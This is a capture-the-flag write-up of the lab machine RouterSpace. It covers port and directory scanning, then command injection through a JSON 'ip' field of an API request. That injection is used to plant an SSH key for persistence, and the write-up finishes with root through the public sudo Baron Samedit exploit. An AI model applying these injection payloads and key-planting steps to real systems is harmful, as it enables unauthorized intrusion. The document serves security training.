![image](https://user-images.githubusercontent.com/105310322/196810007-4c5a006b-e7ef-4ce0-882a-246ee0e8bb5e.png)


### Tools: Feroxbuster, Jadx-gui, Scp

### Vulnerabilities: APK to webpage RCE, Baron Samedit

Nmap tells us that we have a webpage and that ssh is on the machine.

```console
└─$ sudo nmap -A -p- -Pn -T4 10.129.227.47
[sudo] password for npayne: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-19 13:35 CDT
Nmap scan report for 10.129.227.47
Host is up (0.072s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4e4c80aa6af6693af695aa9bc75f90c (RSA)
|   256 7f05cd8c427ba94ab2e6352cc4597802 (ECDSA)
|_  256 2fd7a88bbe2d10b0c9b42952a8942478 (ED25519)
80/tcp open  http
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-30754
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 78
|     ETag: W/"4e-R7mvqXp0PMhP1O1oqHV5OP5+ByY"
|     Date: Wed, 19 Oct 2022 18:37:15 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: uHNA EQ9 B R A h 3AC1 }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-50593
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Wed, 19 Oct 2022 18:37:14 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-38248
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Wed, 19 Oct 2022 18:37:14 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.93%I=7%D=10/19%Time=635043DA%P=x86_64-pc-linux-gnu%r(NUL
SF:L,29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=10/19%Time=635043DA%P=x86_64-pc-linux-gnu%r(Get
SF:Request,2958,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\
SF:nX-Cdn:\x20RouterSpace-50593\r\nAccept-Ranges:\x20bytes\r\nCache-Contro
SF:l:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x2020
SF:21\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Typ
SF:e:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\
SF:x20Wed,\x2019\x20Oct\x202022\x2018:37:14\x20GMT\r\nConnection:\x20close
SF:\r\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n
SF:<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<m
SF:eta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20
SF:\x20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"des
SF:cription\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\
SF:x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\
SF:.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css
SF:/magnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0href=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"s
SF:tylesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,1
SF:08,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x2
SF:0RouterSpace-38248\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/
SF:html;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedp
SF:ZYGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Wed,\x2019\x20Oct\x202022\x2018:3
SF:7:14\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPReques
SF:t,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\
SF:n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(FourOhFourRequest,134,"HTTP/1\.1\x20200\x20OK\r\nX-P
SF:owered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-30754\r\nContent-Typ
SF:e:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2078\r\nETag:\x20
SF:W/\"4e-R7mvqXp0PMhP1O1oqHV5OP5\+ByY\"\r\nDate:\x20Wed,\x2019\x20Oct\x20
SF:2022\x2018:37:15\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20ac
SF:tivity\x20detected\x20!!!\x20{RequestID:\x20uHNA\x20\x20EQ9\x20\x20B\x2
SF:0R\x20A\x20h\x20\x20\x203AC1\x20}\n\n\n\n\n\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), Linux 5.0 - 5.4 (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   100.26 ms 10.10.16.1
2   100.38 ms 10.129.227.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.40 seconds
```
Feroxbuster did not give anything interesting back however I wanted to make a note that it was sending a bunch of infomration back for everything in the wordlist.

This was found by navigating to one of the bogus directories where it says Suspicious activity and then rectified by filtering on those words with -X.

```console
└─$ feroxbuster -u http://10.129.227.47 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q -X 'Suspicious activity detected'
301      GET       10l       16w      173c http://10.129.227.47/css => /css/
301      GET       10l       16w      173c http://10.129.227.47/img => /img/
301      GET       10l       16w      171c http://10.129.227.47/js => /js/
200      GET      536l     1382w    25900c http://10.129.227.47/
200      GET      358l     2856w    46439c http://10.129.227.47/contact.html
301      GET       10l       16w      187c http://10.129.227.47/img/banner => /img/banner/
200      GET      536l     1382w    25900c http://10.129.227.47/index.php
200      GET      536l     1382w    25900c http://10.129.227.47/index.html
301      GET       10l       16w      177c http://10.129.227.47/fonts => /fonts/
301      GET       10l       16w      183c http://10.129.227.47/img/icon => /img/icon/
301      GET       10l       16w      185c http://10.129.227.47/js/vendor => /js/vendor/
Scanning: http://10.129.227.47
Scanning: http://10.129.227.47/css
Scanning: http://10.129.227.47/img
Scanning: http://10.129.227.47/js
Scanning: http://10.129.227.47/
Scanning: http://10.129.227.47/img/banner
Scanning: http://10.129.227.47/fonts
Scanning: http://10.129.227.47/img/icon
Scanning: http://10.129.227.47/js/vendor
```
The interesting part is that the webpage has a download for an APK file so lets grab that.


![image](https://user-images.githubusercontent.com/105310322/197001191-23ba52c8-3c23-4f3e-a586-893807885ef1.png)



I searched the APK for a while looking for anything that popped out. We can find the domain ```routerspace.htb``` but not much else. Also Fuzzing for other domains was not fruitful.


![image](https://user-images.githubusercontent.com/105310322/197001529-44a8bdca-f09f-402c-ac5e-d765fc8a656c.png)



## For reasons I wont get into I am unable to run the app to get to the next step. So I got some help with this portion.

## The whole portion of running the android app and proxy is skipped!

What we want to do is set up the emulator and proxy the application traffic through Burp. Since I am unable to run the app I skipped directly to burp with some the help of just using the burp headers. 


After "running" the app and "capturing" the requests in Burpsuite we can perform Remote Code Execution.

```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
User-Agent: RouterSpaceAgent
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 22
Connection: close
Host: routerspace.htb

{ 
	"ip":"$(id)"
}
```
```
HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-85968
Content-Type: application/json; charset=utf-8
Content-Length: 51
ETag: W/"33-UQijMkk2wbV1ank8umeE9Kenunk"
Date: Wed, 19 Oct 2022 19:27:06 GMT
Connection: close

"uid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
```

Since no reverse shells were working likely because of the firewall, we are going to put some SSH keys on the target. I also had some issues with this part but here are my steps.

1. Create Keys on your host
2. On the victim echo your public key into a file named authorized_keys in the /tmp folder.
3. On the victim copy the authorized_keys file into their .ssh folder.
4. Chmod 600 the file so it can be used.

```
{
  "ip":"$(echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCbFBdKTDZ4PFmZM2B/1pBfhHcSwE1WLpq629DWU9tI84QNb0sHxPjzrPutBWz9L/ahEsDEqCxbfN8QTEvAuTsXQVLfwUqmnocyYIagIukZIlIgmgCoCuL5XPCtX48KZKXnM03vSaerPlxOXwKyael54zRLjn1+05rxv8331ORS7MYOyCPwbZCtdgAq50UQSkRnfsvmcUm8u3bunQK/CcQiXoTGZGzJNy2hWVSgqLkDpSA3zyRA1u5SVGlPX56pQI89a1YmE3m3Cw7mn7+70mTmMPEJaGKvALMGvAmv5H8u8weoP9NaCPNUZciRKQDeh2usgC6LzZ5W/AdfRKsVo4JtcUN/trKiWPfvRxvAPFBmw/9e+eDdM5c/1eXLqeEi4e5O03/FW7F9njhyBVjP0IURm7tHuXvSh3pdS19oVpiHMIppgWd+FZsPow7/5tAltzmPtbPs7LJ1YjrnyG5ossDahZan+XAMRwKhAtcPh8szpoZ0nGaqOGFU+G9El6l5OS8= rogue@rogue' > /tmp/authorized_keys)"
}
```
```
{ 
	"ip":"$(cp /tmp/authorized_keys /home/paul/.ssh/authorized_keys)"
}
```
```
{ 
	"ip":"$(chmod 600 /home/paul/.ssh/authorized_keys)"
}
```

Be sure to confirm the file is not empty and that it made into the .ssh directory.

If done correctly you will be logged into SSH :)


```console
└─$ ssh paul@routerspace.htb -i id_rsa
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Oct 2022 08:17:09 PM UTC

  System load:           0.0
  Usage of /:            71.0% of 3.49GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             218
  Users logged in:       1
  IPv4 address for eth0: 10.129.227.47
  IPv6 address for eth0: dead:beef::250:56ff:feb9:faa8

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct 19 20:11:20 2022 from 10.10.16.16
paul@routerspace:~$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
paul@routerspace:~$ 
```

The next part took me longer than it should have because everytime I run linpeas the same CVE's pop up on almost all machines so I do not like to try them until all other options havbe been exhausted.

I tried out netfilter since it looked promising with the ip_tables module being on the system which is required for it to run. However that one did not work.

Note: There is an example of how to transfer files with SCP further down. SCP is required since the firewall blocks connections. This is how I got linpeas on the victim.

```console
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
```
```console
paul@routerspace:~/.pm2$ lsmod | grep ip_tables
ip_tables              32768  9 iptable_filter
x_tables               40960  10 ip6table_filter,xt_conntrack,iptable_filter,xt_LOG,xt_tcpudp,xt_addrtype,ip6_tables,ipt_REJECT,ip_tables,xt_limit
```

I had some luck with baron samedit, after seeing this CVE pop up on other boxes for so long it was kind of nice to be able to use it finally.

```console
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

Pretty simple PE here. I used blasty's CVE and followed the directions.


https://github.com/blasty/CVE-2021-3156/

SCP over your entire CVE directory.

```console
└─$ scp -r -i ~/.ssh/id_rsa CVE-2021-3156/ paul@routerspace.htb:/tmp 
Makefile                                                                                                                              100%  264     8.2KB/s   00:00    
hax.c                                                                                                                                 100% 4420    40.2KB/s   00:00    
brute.sh     
```

Use the command make.

```console
paul@routerspace:/tmp/CVE-2021-3156$ make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Then run the program to identify the target.

```console
paul@routerspace:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Finally run the command again and pick your target to gain root and get the flags!

```console
paul@routerspace:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
# cat /home/paul/user.txt
244*****************************
# cat /root/root.txt
300*****************************
# 
```
GG!
